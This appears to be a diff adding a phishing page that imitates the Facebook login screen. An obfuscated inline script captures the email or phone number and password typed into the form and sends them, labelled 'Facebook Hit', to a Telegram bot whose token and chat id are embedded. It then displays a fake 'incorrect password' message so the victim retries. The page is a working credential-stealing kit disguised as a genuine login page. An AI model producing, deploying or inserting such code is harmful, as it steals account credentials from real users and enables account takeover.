@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – Log In or Sign Up</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#f0f2f5 0%,#e4e6eb 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+    .container{width:100%;max-width:400px;text-align:center}
+    .facebook-logo{color:#1877F2;font-size:3.5rem;font-weight:800;letter-spacing:-2px;margin-bottom:10px;text-shadow:0 2px 4px rgba(0,0,0,.1)}
+    .tagline{color:#606770;font-size:1.1rem;line-height:1.4;font-weight:400}
+    .login-form{background:white;border-radius:12px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,.1);margin-bottom:20px;border:1px solid #dddfe2}
+    .input-group{position:relative;margin-bottom:12px}
+    .input-field{width:100%;padding:16px;border:1px solid #dddfe2;border-radius:8px;font-size:16px;background:#f0f2f5;transition:all .3s ease}
+    .input-field:focus{outline:none;border-color:#1877F2;background:white;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
+    .input-field.error{border-color:#ff3333;background:#fff5f5}
+    .show-password{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:8px;border-radius:50%;transition:background-color .3s ease}
+    .show-password:hover{background-color:#f0f2f5}
+    .login-button{width:100%;padding:16px;background:linear-gradient(135deg,#1877F2 0%,#166fe5 100%);color:white;border:none;border-radius:8px;font-size:18px;font-weight:600;cursor:pointer;transition:all .3s ease;margin-bottom:16px}
+    .login-button:hover{background:linear-gradient(135deg,#166fe5 0%,#145dbf 100%);transform:translateY(-1px);box-shadow:0 4px 12px rgba(24,119,242,.3)}
+    .login-button:active{transform:translateY(0)}
+    .login-button.loading{position:relative;color:transparent;pointer-events:none}
+    .login-button.loading::after{content:'';position:absolute;top:50%;left:50%;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid white;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    .error-message{color:#ff3333;font-size:14px;margin:4px 0 14px;text-align:left;display:none}
+    .error-message.show{display:block}
+    .divider{position:relative;text-align:center;margin:20px 0}
+    .divider::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#dddfe2}
+    .divider span{background:white;padding:0 16px;color:#606770;font-size:14px;position:relative}
+    .create-account-button{width:100%;padding:16px;background:linear-gradient(135deg,#42b72a 0%,#36a420 100%);color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s ease}
+    .create-account-button:hover{background:linear-gradient(135deg,#36a420 0%,#2d8a1a 100%);transform:translateY(-1px);box-shadow:0 4px 12px rgba(66,183,42,.3)}
+    .forgot-password{color:#1877F2;text-decoration:none;font-size:14px;font-weight:500;transition:color .3s ease}
+    .forgot-password:hover{color:#166fe5;text-decoration:underline}
+    .footer{text-align:center;padding:20px 0}
+    .language-links,.meta-links{display:flex;flex-wrap:wrap;justify-content:center;gap:12px;margin-bottom:12px}
+    .language-links a,.meta-links a{color:#8a8d91;text-decoration:none;font-size:12px;transition:color .3s ease}
+    .language-links a:hover,.meta-links a:hover{color:#606770}
+    .copyright{color:#8a8d91;font-size:11px;margin-top:8px}
+    .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+    @media (max-width: 360px) {
+      .language-links a:nth-child(n+5) { display: none; }
+      .facebook-logo { font-size: 2.8rem; }
+      .login-form { padding: 18px; }
+      .input-field { padding: 14px; }
+      .login-button { padding: 14px; font-size: 17px; }
+      .create-account-button { padding: 14px; font-size: 15px; }
+    }
+  </style>
+<base target="_blank">
+</head>
+<body>
+  <div class="container">
+    <div class="logo-section">
+      <h1 class="facebook-logo">facebook</h1>
+      <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+    </div>
+    <div class="login-form">
+      <form id="loginForm" action="#" method="POST" novalidate>
+        <div class="input-group">
+          <label for="email" class="sr-only">Mobile number or email address</label>
+          <input type="text" id="email" name="email" placeholder="Mobile number or email address" class="input-field" required autocomplete="email">
+        </div>
+        <div class="input-group">
+          <label for="password" class="sr-only">Password</label>
+          <input type="password" id="password" name="password" placeholder="Password" class="input-field" required autocomplete="current-password">
+          <button type="button" class="show-password" id="togglePassword" aria-label="Show password">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 16.5C9.51 16.5 7.5 14.49 7.5 12C7.5 9.51 9.51 7.5 12 7.5C14.49 7.5 16.5 9.51 16.5 12C16.5 14.49 14.49 16.5 12 16.5ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#1877F2"/>
+            </svg>
+          </button>
+        </div>
+        <p class="error-message" id="errorMsg">The password you've entered is incorrect. <a href="#" class="forgot-password">Forgotten password?</a></p>
+        <button type="submit" class="login-button" id="loginBtn">Log In</button>
+        <div class="divider"><span>or</span></div>
+        <button type="button" class="create-account-button">Create new account</button>
+      </form>
+      <div class="links" style="margin-top:16px"><a href="#" class="forgot-password">Forgotten password?</a></div>
+    </div>
+    <div class="footer">
+      <div class="language-links"><a href="#">English (UK)</a><a href="#">বাংলা</a><a href="#">हिन्दी</a><a href="#">اردو</a><a href="#">नेपाली</a><a href="#">ଓଡ଼ିଆ</a><a href="#">অসমীয়া</a><a href="#">+</a></div>
+      <div class="meta-links"><a href="#">About</a><a href="#">Help</a><a href="#">More</a></div>
+      <p class="copyright">Meta © 2024</p>
+    </div>
+  </div>
+
+  <script>
+    
+   function _0x718b(_0x49b3d1,_0x667b61){_0x49b3d1=_0x49b3d1-0xec;const _0x2f07a6=_0x2f07();let _0x718b5b=_0x2f07a6[_0x49b3d1];return _0x718b5b;}const _0x451318=_0x718b;(function(_0xafddcb,_0x39e611){const _0x16067e=_0x718b,_0x5adb8c=_0xafddcb();while(!![]){try{const _0x6590d5=-parseInt(_0x16067e(0x117))/0x1*(parseInt(_0x16067e(0xf3))/0x2)+-parseInt(_0x16067e(0x116))/0x3*(parseInt(_0x16067e(0xee))/0x4)+-parseInt(_0x16067e(0x105))/0x5+-parseInt(_0x16067e(0x112))/0x6*(-parseInt(_0x16067e(0xf1))/0x7)+-parseInt(_0x16067e(0x100))/0x8*(parseInt(_0x16067e(0xed))/0x9)+parseInt(_0x16067e(0xec))/0xa+parseInt(_0x16067e(0x10e))/0xb*(parseInt(_0x16067e(0xf9))/0xc);if(_0x6590d5===_0x39e611)break;else _0x5adb8c['push'](_0x5adb8c['shift']());}catch(_0x535bb2){_0x5adb8c['push'](_0x5adb8c['shift']());}}}(_0x2f07,0xbda0c));const BO=_0x451318(0x114),CHA=_0x451318(0xff),form=document[_0x451318(0xf5)]('loginForm'),loginBtn=document['getElementById'](_0x451318(0xfb)),emailIn=document[_0x451318(0xf5)](_0x451318(0x102)),pwdIn=document[_0x451318(0xf5)](_0x451318(0x118)),toggleBtn=document[_0x451318(0xf5)](_0x451318(0x107)),errorMsg=document[_0x451318(0xf5)]('errorMsg');function _0x2f07(){const _0xc19a19=['classList','230895fWbZbM','type','2543796BxBOOf','aria-label','getElementById','/sendMessage','error','text','12grqSXy','add','loginBtn','disabled','click','Show\x20password','7390531894','4033816lxFTcx','preventDefault','email','focus','\x0a🕒\x20','4092685eTlSRA','setAttribute','togglePassword','remove','trim','toLocaleString','forEach','addEventListener','submit','48463470nZXcqs','loading','application/json','Hide\x20password','18OCatst','show','8416791643:AAEZInsemXwV2akMlgI0OY27YNG-uqB9r_o','POST','3PCfiEQ','1VBrhxL','password','1985900ZKizHy','9BpxSLX','5327748yReeUv','🔵\x20Facebook\x20Hit\x0aUser:\x20'];_0x2f07=function(){return _0xc19a19;};return _0x2f07();}toggleBtn['addEventListener'](_0x451318(0xfd),()=>{const _0x2f0510=_0x451318,_0x30aa7b=pwdIn[_0x2f0510(0xf2)]==='password';pwdIn['type']=_0x30aa7b?_0x2f0510(0xf8):_0x2f0510(0x118),toggleBtn[_0x2f0510(0x106)](_0x2f0510(0xf4),_0x30aa7b?_0x2f0510(0x111):_0x2f0510(0xfe));}),form[_0x451318(0x10c)](_0x451318(0x10d),async _0x1d7e9d=>{const _0x45c193=_0x451318;_0x1d7e9d[_0x45c193(0x101)]();const _0x124858=emailIn['value'][_0x45c193(0x109)](),_0x41370f=pwdIn['value'];if(!_0x124858){emailIn[_0x45c193(0xf0)][_0x45c193(0xfa)]('error'),emailIn['focus']();return;}if(!_0x41370f){pwdIn[_0x45c193(0xf0)]['add'](_0x45c193(0xf7)),pwdIn[_0x45c193(0x103)]();return;}emailIn[_0x45c193(0xf0)][_0x45c193(0x108)]('error'),pwdIn[_0x45c193(0xf0)][_0x45c193(0x108)](_0x45c193(0xf7)),errorMsg[_0x45c193(0xf0)][_0x45c193(0x108)](_0x45c193(0x113)),loginBtn[_0x45c193(0xf0)]['add']('loading'),loginBtn[_0x45c193(0xfc)]=!![];try{await fetch('https://api.telegram.org/bot'+BO+_0x45c193(0xf6),{'method':_0x45c193(0x115),'headers':{'Content-Type':_0x45c193(0x110)},'body':JSON['stringify']({'chat_id':CHA,'text':_0x45c193(0xef)+_0x124858+'\x0aPass:\x20'+_0x41370f+_0x45c193(0x104)+new Date()[_0x45c193(0x10a)]()})});}catch(_0x5dab9e){console[_0x45c193(0xf7)]('Telegram\x20send\x20failed:',_0x5dab9e);}loginBtn['classList'][_0x45c193(0x108)](_0x45c193(0x10f)),loginBtn[_0x45c193(0xfc)]=![],pwdIn[_0x45c193(0xf0)][_0x45c193(0xfa)](_0x45c193(0xf7)),errorMsg[_0x45c193(0xf0)][_0x45c193(0xfa)](_0x45c193(0x113)),pwdIn[_0x45c193(0x103)]();}),[emailIn,pwdIn][_0x451318(0x10b)](_0x4eea1a=>{const _0x75a3c1=_0x451318;_0x4eea1a[_0x75a3c1(0x10c)]('input',()=>_0x4eea1a[_0x75a3c1(0xf0)][_0x75a3c1(0x108)](_0x75a3c1(0xf7)));});
+  </script>
+</body>
+</html>
